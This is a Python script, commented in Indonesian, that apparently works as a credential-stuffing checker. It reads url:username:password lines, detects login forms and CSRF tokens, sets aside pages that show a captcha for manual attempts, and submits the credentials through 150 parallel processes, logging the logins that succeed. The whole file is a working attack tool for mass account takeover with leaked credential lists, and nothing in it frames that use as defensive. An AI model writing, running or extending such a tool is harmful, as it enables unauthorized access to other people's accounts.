import requests
from bs4 import BeautifulSoup
import re
from multiprocessing import Pool, Manager
import time
from urllib.parse import urlparse, urljoin
import os
import codecs

# Fungsi yang sudah ada tetap sama hingga detect_captcha
def normalize_url(url):
    """Menambahkan https:// ke URL jika tidak ada skema."""
    url = url.replace(' | ', '').strip()
    if not urlparse(url).scheme:
        url = 'https://' + url
    return url

def is_valid_url(url):
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc]) and result.scheme in ['http', 'https']
    except ValueError:
        return False

def is_login_page(url):
    try:
        url = normalize_url(url)
        if not is_valid_url(url):
            raise ValueError(f"URL tidak valid: {url}")
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        response = requests.get(url, headers=headers, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        login_indicators = [
            soup.find('input', {'type': 'password'}),
            soup.find('input', {'name': re.compile('password|pass|pwd', re.I)}),
            soup.find('input', {'name': re.compile('username|user|login|email', re.I)}),
            soup.find('form', {'method': re.compile('post', re.I)})
        ]
        
        return sum(1 for indicator in login_indicators if indicator) >= 2
    
    except Exception as e:
        print(f"Error checking page: {e}")
        return False

def detect_form_fields_and_tokens(url):
    try:
        url = normalize_url(url)
        if not is_valid_url(url):
            raise ValueError(f"URL tidak valid: {url}")
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        
        session = requests.Session()
        response = session.get(url, headers=headers, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        forms = soup.find_all('form')
        if not forms:
            return None, None, None, None, None
            
        form = forms[0]
        action = form.get('action', url)
        if not action.startswith('http'):
            action = urljoin(url, action)
            
        method = form.get('method', 'post').lower()
        
        inputs = form.find_all('input')
        fields = {}
        
        for input_tag in inputs:
            name = input_tag.get('name')
            input_type = input_tag.get('type', 'text')
            value = input_tag.get('value', '')
            if name:
                fields[name] = {
                    'type': input_type,
                    'required': input_tag.get('required') is not None,
                    'value': value
                }
                
        tokens = {}
        hidden_inputs = form.find_all('input', {'type': 'hidden'})
        for hidden in hidden_inputs:
            name = hidden.get('name')
            value = hidden.get('value')
            if name and value:
                if re.search(r'csrf|token|auth|nonce', name, re.I):
                    tokens[name] = value
        
        for header_name, header_value in response.headers.items():
            if re.search(r'csrf|token|auth', header_name, re.I):
                tokens[header_name] = header_value
                
        return action, method, fields, tokens, session
    
    except Exception as e:
        print(f"Error detecting form fields and tokens: {e}")
        return None, None, None, None, None

def detect_captcha(url):
    try:
        url = normalize_url(url)
        if not is_valid_url(url):
            raise ValueError(f"URL tidak valid: {url}")
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        
        response = requests.get(url, headers=headers, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        captcha_indicators = [
            'captcha' in response.text.lower(),
            soup.find('div', {'class': re.compile('captcha', re.I)}),
            soup.find('img', {'src': re.compile('captcha', re.I)}),
            'g-recaptcha' in response.text,
            'hcaptcha' in response.text
        ]
        
        return any(captcha_indicators)
    
    except Exception as e:
        print(f"Error detecting captcha: {e}")
        return False

def attempt_login(action, method, fields, tokens, session, username, password):
    try:
        action = normalize_url(action)
        if not is_valid_url(action):
            raise ValueError(f"Action URL tidak valid: {action}")
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        
        payload = {name: info['value'] if info['value'] else username if info['type'] != 'password' else password 
                  for name, info in fields.items()}
        payload.update(tokens)
        
        initial_url = action
        
        if method.lower() == 'post':
            response = session.post(action, data=payload, headers=headers, timeout=10, allow_redirects=True)
        else:
            response = session.get(action, params=payload, headers=headers, timeout=10, allow_redirects=True)
            
        final_url = response.url
        soup = BeautifulSoup(response.text, 'html.parser')
        
        redirect_happened = len(response.history) > 0
        if redirect_happened:
            print(f"Redirect detected: {len(response.history)} steps")
            for r in response.history:
                print(f" - {r.status_code} -> {r.url}")
        
        success_indicators = [
            (response.status_code == 200, "Status code is 200 (OK)"),
            (final_url != initial_url, "Redirected to a different page"),
            (soup.find('a', {'href': re.compile('logout|signout|sign-out', re.I)}) is not None, "Logout link present"),
            (soup.find('div', {'class': re.compile('dashboard|profile|welcome|account', re.I)}) is not None, "Dashboard/Profile/Welcome element found"),
            (any(keyword.lower() in response.text.lower() for keyword in ['welcome', 'dashboard', 'profile', 'account', 'logged in']), "Success keywords found in content"),
            (soup.find('input', {'type': 'password'}) is None, "No password field present"),
            (soup.find('form', {'action': re.compile('login|signin|auth', re.I)}) is None, "No login form present"),
            (not any(error.lower() in response.text.lower() for error in ['error', 'invalid', 'incorrect', 'failed', 'try again']), "No error messages detected")
        ]
        
        failure_indicators = [
            (response.status_code in (401, 403, 400), "Unauthorized or bad request status"),
            (soup.find('input', {'type': 'password'}) is not None, "Password field still present"),
            (soup.find('form', {'action': re.compile('login|signin|auth', re.I)}) is not None, "Login form still present"),
            (soup.find('div', {'class': re.compile('error|fail|invalid|alert', re.I)}) is not None, "Error element found"),
            (any(error.lower() in response.text.lower() for error in [
                'invalid credentials', 'login failed', 'incorrect password', 
                'authentication failed', 'wrong username', 'access denied'
            ]), "Specific error message detected"),
            (re.search(r'login|err|error|fail', final_url.lower()), "Final URL indicates login or error page")
        ]
        
        success_score = sum(1 for condition, _ in success_indicators if condition)
        failure_score = sum(1 for condition, _ in failure_indicators if condition)
        
        success_reasons = [reason for condition, reason in success_indicators if condition]
        failure_reasons = [reason for condition, reason in failure_indicators if condition]
        
        print(f"Debug - Success Score: {success_score}, Failure Score: {failure_score}")
        print(f"Initial URL: {initial_url}")
        print(f"Final URL: {final_url}")
        print(f"Final Status Code: {response.status_code}")
        if success_reasons:
            print(f"Success Reasons: {', '.join(success_reasons)}")
        if failure_reasons:
            print(f"Failure Reasons: {', '.join(failure_reasons)}")
        
        if success_score >= 5 and failure_score == 0 and "Logout link present" in success_reasons:
            print("✓ Indikator menunjukkan login berhasil")
            return True, final_url, success_reasons
        elif failure_score > 0:
            print("✗ Indikator menunjukkan login gagal")
            return False, final_url, []
        else:
            print("⚠ Hasil ambigu atau tidak cukup bukti login berhasil")
            return False, final_url, []
            
    except Exception as e:
        print(f"Error attempting login: {e}")
        return False, None, []

def save_result_immediately(result, reasons):
    """Simpan hasil login yang berhasil ke file results.txt dengan alasan."""
    try:
        reason_text = "; ".join(reasons) if reasons else "No reasons provided"
        full_result = f"{result} | Reasons: {reason_text}"
        with open("results.txt", "a", encoding="utf-8", errors="ignore") as f:
            f.write(f"{full_result}\n")
        print(f"✓ Hasil berhasil langsung tersimpan: {full_result}")
    except Exception as e:
        print(f"Error menyimpan hasil: {e}")

def save_to_trymanual(entry):
    """Simpan entri ke trymanual.txt jika ditemukan captcha."""
    try:
        with open("trymanual.txt", "a", encoding="utf-8", errors="ignore") as f:
            f.write(f"{entry}\n")
        print(f"✓ Entri disimpan ke trymanual.txt: {entry}")
    except Exception as e:
        print(f"Error menyimpan ke trymanual.txt: {e}")

def process_entry(args):
    i, line, results = args
    line = line.strip()
    if not line:
        return
    
    try:
        parts = line.split(':', 2)
        if len(parts) != 3:
            print(f"✗ Format salah pada baris {i}: {line} (harus url:username:password)")
            return
        
        url_raw, username, password = parts
        url = normalize_url(url_raw)
        print(f"\n[{i}] Memproses: {url} | {username} | {password}")
        
        if not is_valid_url(url):
            print(f"✗ URL tidak valid: {url}")
            return
        
        print("Mengecek apakah halaman login...")
        if is_login_page(url):
            print("✓ Ini adalah halaman login")
            
            print("\nMendeteksi form fields dan tokens...")
            action, method, fields, tokens, session = detect_form_fields_and_tokens(url)
            
            if action and fields:
                print(f"Action URL: {action}")
                print(f"Method: {method}")
                print("Fields yang ditemukan:")
                for name, info in fields.items():
                    required = " (required)" if info['required'] else ""
                    value = f" (value: {info['value']})" if info['value'] else ""
                    print(f"- {name} (type: {info['type']}){required}{value}")
                
                if tokens:
                    print("\nTokens yang ditemukan:")
                    for name, value in tokens.items():
                        print(f"- {name}: {value}")
                else:
                    print("\nTidak ada tokens (CSRF/auth) yang terdeteksi")
                
                payload = {name: info['value'] if info['value'] else username if info['type'] != 'password' else password 
                          for name, info in fields.items()}
                payload.update(tokens)
                print("\nPayload yang digunakan:")
                print(payload)
            
            print("\nMengecek keberadaan captcha...")
            if detect_captcha(url):
                print("⚠ Terdeteksi adanya captcha di halaman ini")
                print("Login tidak dapat diuji karena adanya captcha")
                save_to_trymanual(f"{url}:{username}:{password}")
            else:
                print("✓ Tidak terdeteksi captcha")
                print("\nMencoba login...")
                success, final_url, reasons = attempt_login(action, method, fields, tokens, session, username, password)
                if success:
                    print(f"✓ Login berhasil! Redirected to: {final_url}")
                    result = f"{url}:{username}:{password} | Redirected to: {final_url}"
                    save_result_immediately(result, reasons)
                    results.append(result)
                else:
                    print(f"✗ Login gagal. Final URL: {final_url}")
        else:
            print("✗ Ini bukan halaman login")
            
    except Exception as e:
        print(f"Error pada baris {i}: {e}")

def main():
    filename = "list.txt"
    print(f"Membaca data dari {filename}...")
    
    try:
        if not os.path.exists("results.txt"):
            with open("results.txt", "w", encoding="utf-8", errors="ignore") as f:
                pass
            print("File results.txt dibuat")
        
        if not os.path.exists("trymanual.txt"):
            with open("trymanual.txt", "w", encoding="utf-8", errors="ignore") as f:
                pass
            print("File trymanual.txt dibuat")
        
        with open(filename, 'r', encoding='utf-8', errors='ignore') as file:
            lines = file.readlines()
            if not lines:
                print("File kosong!")
                return
                
            manager = Manager()
            results = manager.list()
            
            tasks = [(i, line, results) for i, line in enumerate(lines, 1) if line.strip()]
            
            with Pool(processes=150) as pool:
                pool.map(process_entry, tasks)
            
            print(f"\nProses selesai. Total {len(results)} login berhasil.")
            
    except FileNotFoundError:
        print(f"File {filename} tidak ditemukan!")
    except Exception as e:
        print(f"Error membaca file: {e}")

if __name__ == "__main__":
    main()